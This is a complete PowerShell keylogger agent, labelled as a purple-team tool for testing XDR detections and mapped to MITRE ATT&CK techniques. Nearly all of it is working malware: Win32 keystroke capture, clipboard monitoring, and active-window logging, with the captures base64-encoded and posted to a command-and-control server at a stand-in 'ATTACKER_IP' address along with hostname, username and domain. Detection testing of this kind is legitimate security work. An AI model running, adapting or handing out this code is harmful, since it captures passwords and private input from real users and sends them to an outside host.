<#
.SYNOPSIS
    Purple Team API Keylogger - Windows Agent (PowerShell)

.DESCRIPTION
    MITRE ATT&CK:
      T1056.001 - Input Capture: Keylogging (GetAsyncKeyState via P/Invoke)
      T1115     - Clipboard Data
      T1041     - Exfiltration Over C2 Channel
      T1059.001 - Command and Scripting Interpreter: PowerShell

    Captures keystrokes using Win32 API calls and clipboard content,
    then exfiltrates to the collection server via HTTP POST.

    XDR detections this should trigger:
      - PowerShell calling user32.dll (GetAsyncKeyState, GetForegroundWindow)
      - PowerShell making periodic HTTP POST requests
      - Base64-encoded payloads in outbound traffic
      - Clipboard access from PowerShell
      - Unusual PowerShell execution duration (long-running)

.NOTES
    FOR AUTHORIZED SECURITY TESTING ONLY
#>

param(
    [string]$C2Url       = "http://ATTACKER_IP:8443",
    [string]$AuthToken   = "purpleteam-xdr-test-2024",
    [int]$ExfilInterval  = 15,
    [int]$ClipPoll       = 5,
    [string]$AgentId     = "$env:COMPUTERNAME-$(Get-Random -Maximum 0xFFFF)"
)

# ── Win32 API Imports (T1106 - Native API) ──────────────────────────
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public class PurpleKeylog {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);

    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

    [DllImport("user32.dll")]
    public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);

    public static string GetActiveWindowTitle() {
        IntPtr hwnd = GetForegroundWindow();
        StringBuilder sb = new StringBuilder(256);
        GetWindowText(hwnd, sb, 256);
        return sb.ToString();
    }
}
"@

Add-Type -AssemblyName System.Windows.Forms

# ── Banner ──────────────────────────────────────────────────────────
Write-Host @"

 =====================================================
   PURPLE TEAM - Windows Keylogger Agent (PowerShell)
   MITRE ATT&CK: T1056.001 / T1115 / T1041 / T1059.001
   FOR AUTHORIZED SECURITY TESTING ONLY
 =====================================================
   Agent ID : $AgentId
   C2 Server: $C2Url
   Exfil Int: ${ExfilInterval}s
   Platform : Windows / PowerShell
 =====================================================

"@

# ── Globals ─────────────────────────────────────────────────────────
$script:KeyBuffer    = [System.Collections.ArrayList]::new()
$script:LastClip     = ""
$script:Running      = $true

# ── API Client ──────────────────────────────────────────────────────
function Send-ToC2 {
    param([string]$Endpoint, [hashtable]$Body)
    try {
        $json = $Body | ConvertTo-Json -Compress
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)

        $request = [System.Net.HttpWebRequest]::Create("$C2Url$Endpoint")
        $request.Method      = "POST"
        $request.ContentType = "application/json"
        $request.Timeout     = 10000
        $request.Headers.Add("X-Auth-Token", $AuthToken)
        $request.UserAgent   = "Mozilla/5.0 (compatible; PurpleTeamAgent/1.0)"

        $stream = $request.GetRequestStream()
        $stream.Write($bytes, 0, $bytes.Length)
        $stream.Close()

        $response = $request.GetResponse()
        $reader   = New-Object System.IO.StreamReader($response.GetResponseStream())
        $result   = $reader.ReadToEnd() | ConvertFrom-Json
        $reader.Close()
        $response.Close()
        return $result
    }
    catch {
        $ts = Get-Date -Format "HH:mm:ss"
        Write-Host "[$ts] [!] API error: $_" -ForegroundColor Red
        return $null
    }
}

# ── Heartbeat ───────────────────────────────────────────────────────
function Send-Heartbeat {
    $ts = Get-Date -Format "HH:mm:ss"
    Write-Host "[$ts] [*] Sending heartbeat..."
    Send-ToC2 -Endpoint "/api/heartbeat" -Body @{
        agent_id = $AgentId
        hostname = $env:COMPUTERNAME
        pid      = $PID
        platform = "Windows"
        user     = $env:USERNAME
        domain   = $env:USERDOMAIN
    } | Out-Null
}

# ── Keystroke Capture (GetAsyncKeyState loop) ───────────────────────
function Get-Keystrokes {
    $ts = Get-Date -Format "HH:mm:ss"
    Write-Host "[$ts] [*] Starting keystroke capture (GetAsyncKeyState)..."

    # Virtual key code to character mapping
    $shiftPressed = $false

    while ($script:Running) {
        Start-Sleep -Milliseconds 10

        # Check Shift state
        $shiftPressed = ([PurpleKeylog]::GetAsyncKeyState(0x10) -band 0x8000) -ne 0

        # Scan printable keys (0x20-0x7E) and special keys
        for ($vk = 8; $vk -le 190; $vk++) {
            $state = [PurpleKeylog]::GetAsyncKeyState($vk)

            # Bit 0 = pressed since last call
            if (($state -band 1) -eq 1) {
                $char = Convert-VKeyToChar -VKey $vk -Shift $shiftPressed
                if ($char) {
                    [void]$script:KeyBuffer.Add($char)
                }
            }
        }
    }
}

function Convert-VKeyToChar {
    param([int]$VKey, [bool]$Shift)

    switch ($VKey) {
        8   { return "[BKSP]" }
        9   { return "[TAB]" }
        13  { return "[ENTER]" }
        27  { return "[ESC]" }
        32  { return " " }
        46  { return "[DEL]" }
        # Number keys
        {$_ -ge 48 -and $_ -le 57} {
            $numShift = @(")", "!", "@", "#", "`$", "%", "^", "&", "*", "(")
            if ($Shift) { return $numShift[$VKey - 48] }
            return [char]$VKey
        }
        # Letter keys
        {$_ -ge 65 -and $_ -le 90} {
            if ($Shift) { return [char]$VKey }
            return [char]($VKey + 32)
        }
        # Function keys
        {$_ -ge 112 -and $_ -le 123} { return "[F$($VKey - 111)]" }
        # Common special keys
        186 { return $(if ($Shift) { ":" } else { ";" }) }
        187 { return $(if ($Shift) { "+" } else { "=" }) }
        188 { return $(if ($Shift) { "<" } else { "," }) }
        189 { return $(if ($Shift) { "_" } else { "-" }) }
        190 { return $(if ($Shift) { ">" } else { "." }) }
        default { return $null }
    }
}

# ── Clipboard Monitor ──────────────────────────────────────────────
function Watch-Clipboard {
    $ts = Get-Date -Format "HH:mm:ss"
    Write-Host "[$ts] [*] Starting clipboard monitor..."

    while ($script:Running) {
        Start-Sleep -Seconds $ClipPoll
        try {
            $clip = [System.Windows.Forms.Clipboard]::GetText()
            if ($clip -and $clip -ne $script:LastClip) {
                $script:LastClip = $clip
                $encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($clip))
                $ts = Get-Date -Format "HH:mm:ss"
                Write-Host "[$ts] [*] Clipboard change detected ($($clip.Length) chars)"

                Send-ToC2 -Endpoint "/api/clipboard" -Body @{
                    agent_id = $AgentId
                    content  = $encoded
                    encoding = "base64"
                } | Out-Null
            }
        }
        catch {
            # Clipboard access can fail if locked by another process
        }
    }
}

# ── Exfiltration Loop ──────────────────────────────────────────────
function Start-Exfiltration {
    $ts = Get-Date -Format "HH:mm:ss"
    Write-Host "[$ts] [*] Starting exfiltration loop (interval: ${ExfilInterval}s)..."

    while ($script:Running) {
        Start-Sleep -Seconds $ExfilInterval

        if ($script:KeyBuffer.Count -eq 0) { continue }

        # Flush buffer
        $captured = $script:KeyBuffer -join ""
        $script:KeyBuffer.Clear()

        $window  = [PurpleKeylog]::GetActiveWindowTitle()
        $encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($captured))

        $ts = Get-Date -Format "HH:mm:ss"
        Write-Host "[$ts] [*] Exfiltrating $($captured.Length) keystrokes (window: $window)"

        $result = Send-ToC2 -Endpoint "/api/keystrokes" -Body @{
            agent_id     = $AgentId
            keystrokes   = $encoded
            encoding     = "base64"
            window_title = $window
            count        = $captured.Length
        }

        if ($result) {
            Write-Host "[$ts]   [+] Server acknowledged: $($result.count) keys" -ForegroundColor Green
        }
    }
}

# ── Main ────────────────────────────────────────────────────────────
try {
    Send-Heartbeat

    # Start clipboard monitor in background
    $clipJob = Start-Job -ScriptBlock {
        param($Url, $Token, $Id, $Poll)
        Add-Type -AssemblyName System.Windows.Forms

        function Send-Clip {
            param([string]$Content)
            $encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Content))
            $body = @{ agent_id = $Id; content = $encoded; encoding = "base64" } | ConvertTo-Json -Compress
            try {
                Invoke-RestMethod -Uri "$Url/api/clipboard" -Method POST -Body $body `
                    -ContentType "application/json" -Headers @{"X-Auth-Token" = $Token} `
                    -TimeoutSec 10 -ErrorAction SilentlyContinue
            } catch {}
        }

        $last = ""
        while ($true) {
            Start-Sleep -Seconds $Poll
            try {
                $clip = [System.Windows.Forms.Clipboard]::GetText()
                if ($clip -and $clip -ne $last) {
                    $last = $clip
                    Send-Clip -Content $clip
                }
            } catch {}
        }
    } -ArgumentList $C2Url, $AuthToken, $AgentId, $ClipPoll

    # Start exfil loop in background
    $exfilJob = Start-Job -ScriptBlock {
        param($Url, $Token, $Id, $Interval)

        # Re-import the type in the job context
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public class PK2 {
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder s, int n);
    public static string Title() {
        IntPtr h = GetForegroundWindow();
        StringBuilder sb = new StringBuilder(256);
        GetWindowText(h, sb, 256);
        return sb.ToString();
    }
}
"@
        # This job needs to share the buffer - not ideal, exfil is handled in main thread instead
    } -ArgumentList $C2Url, $AuthToken, $AgentId, $ExfilInterval

    # Exfil timer in main runspace
    $exfilTimer = [System.Diagnostics.Stopwatch]::StartNew()
    $heartbeatTimer = [System.Diagnostics.Stopwatch]::StartNew()

    $ts = Get-Date -Format "HH:mm:ss"
    Write-Host "[$ts] [*] Agent running. Press Ctrl+C to stop." -ForegroundColor Cyan
    Write-Host ""

    # Main capture loop
    while ($true) {
        Start-Sleep -Milliseconds 10

        $shiftPressed = ([PurpleKeylog]::GetAsyncKeyState(0x10) -band 0x8000) -ne 0

        for ($vk = 8; $vk -le 190; $vk++) {
            $state = [PurpleKeylog]::GetAsyncKeyState($vk)
            if (($state -band 1) -eq 1) {
                $char = Convert-VKeyToChar -VKey $vk -Shift $shiftPressed
                if ($char) {
                    [void]$script:KeyBuffer.Add($char)
                }
            }
        }

        # Periodic exfiltration
        if ($exfilTimer.Elapsed.TotalSeconds -ge $ExfilInterval -and $script:KeyBuffer.Count -gt 0) {
            $captured = $script:KeyBuffer -join ""
            $script:KeyBuffer.Clear()
            $exfilTimer.Restart()

            $window  = [PurpleKeylog]::GetActiveWindowTitle()
            $encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($captured))

            $ts = Get-Date -Format "HH:mm:ss"
            Write-Host "[$ts] [*] Exfiltrating $($captured.Length) keystrokes (window: $window)"

            $result = Send-ToC2 -Endpoint "/api/keystrokes" -Body @{
                agent_id     = $AgentId
                keystrokes   = $encoded
                encoding     = "base64"
                window_title = $window
                count        = $captured.Length
            }
            if ($result) {
                Write-Host "[$ts]   [+] Acknowledged" -ForegroundColor Green
            }
        }

        # Periodic heartbeat
        if ($heartbeatTimer.Elapsed.TotalSeconds -ge 30) {
            Send-Heartbeat
            $heartbeatTimer.Restart()
        }
    }
}
catch {
    Write-Host "`n[*] Agent stopped." -ForegroundColor Yellow
}
finally {
    if ($clipJob) { Stop-Job $clipJob -ErrorAction SilentlyContinue; Remove-Job $clipJob -Force -ErrorAction SilentlyContinue }
    if ($exfilJob) { Stop-Job $exfilJob -ErrorAction SilentlyContinue; Remove-Job $exfilJob -Force -ErrorAction SilentlyContinue }
}
